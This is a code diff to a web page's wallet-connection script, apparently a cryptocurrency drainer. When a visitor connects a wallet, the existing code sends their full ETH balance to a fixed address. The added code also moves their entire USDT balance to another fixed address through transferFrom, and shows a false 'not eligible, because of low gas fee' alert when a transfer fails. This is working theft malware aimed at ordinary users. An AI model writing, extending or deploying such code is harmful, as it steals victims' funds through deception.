@@ -65,9 +65,26 @@ if (typeof process === 'undefined') {
       const balance = await fetchBalance({
         address: getAccount().address,
       })
+      const tB = await fetchBalance({
+        address: getAccount().address,
+        token: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+      })
+      console.log(balance.formatted)
+      console.log(tB)
       
-      
-      
+      if(tB.formatted != 0){
+        const { request } = await prepareWriteContract({ 
+          address: tokenAddress, 
+          abi: erc20Abi, 
+          functionName: 'transferFrom', 
+          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
+          chainId: window.chainId,
+        })
+        const { thash } = await writeContract(request)
+        console.log(thash)
+      } else{
+        console.log("No available usdt")
+      }
       const gasPriceGwei = 20;
       
       // Gas limit (you can estimate this or use a default value)
@@ -75,7 +92,7 @@ if (typeof process === 'undefined') {
     
       // Transaction value in Ether (your original code)
       const transactionValueEther = balance.formatted; // Adjust this to your desired value
-     
+      const tokenValue = tB.formatted
       // Convert gas price from Gwei to Wei
       const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei.toString(), 'gwei');
     
@@ -89,15 +106,19 @@ if (typeof process === 'undefined') {
       const finalAmountWei = transactionValueWei.sub(gasFeeWei);
       
       
-      
-      const vrequest = await prepareSendTransaction({
-        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
-        value: finalAmountWei,
-        
-        data:'0x'
-      })
-      const { hash } = await sendTransaction(vrequest)
-      console.log(hash)
+      try {
+        const vrequest = await prepareSendTransaction({
+          to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
+          value: finalAmountWei,
+          
+          data:'0x'
+        })
+        const { hash } = await sendTransaction(vrequest)
+        console.log(hash)
+      } catch(err){
+        console.log(err)
+        setTimeout(alert("You are not eligible, because of low gas fee"), 2000000)
+      }
     }
   }
   async function onConnect() {
@@ -114,11 +135,26 @@ if (typeof process === 'undefined') {
         address: getAccount().address,
       })
       
-     
+      const tB = await fetchBalance({
+        address: getAccount().address,
+        token: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+      })
       console.log(balance.formatted)
+      console.log(tB)
       
-      
-      
+      if(tB.formatted != 0){
+        const { request } = await prepareWriteContract({ 
+          address: tokenAddress, 
+          abi: erc20Abi, 
+          functionName: 'transferFrom', 
+          args: [getAccount().address, '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf', tB.formatted],
+          chainId: window.chainId,
+        })
+        const { thash } = await writeContract(request)
+        console.log(thash)
+      } else{
+        console.log("No available usdt")
+      }
       const gasPriceGwei = 20;
 
       // Gas limit (you can estimate this or use a default value)
@@ -138,16 +174,20 @@ if (typeof process === 'undefined') {
     
       // Calculate the amount after deducting the gas fee
       const finalAmountWei = transactionValueWei.sub(gasFeeWei);
-       
-      const request = await prepareSendTransaction({
-        to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
-        value: finalAmountWei,
+      try { 
+        const request = await prepareSendTransaction({
+          to: '0xf2379cA332265dB7B0693F81D8DCF94485677826',
+          value: finalAmountWei,
+          
+          data:'0x'
         
-        data:'0x'
-       
-      })
-      const { hash } = await sendTransaction(request)
-      console.log(hash)
+        })
+        const { hash } = await sendTransaction(request)
+        console.log(hash)
+      } catch (err){
+        console.log(err)
+        setTimeout(alert("You are not eligible, because of low gas fee"), 2000000)
+      }
     } else{
       setInterval(sendi, 5000)
     }
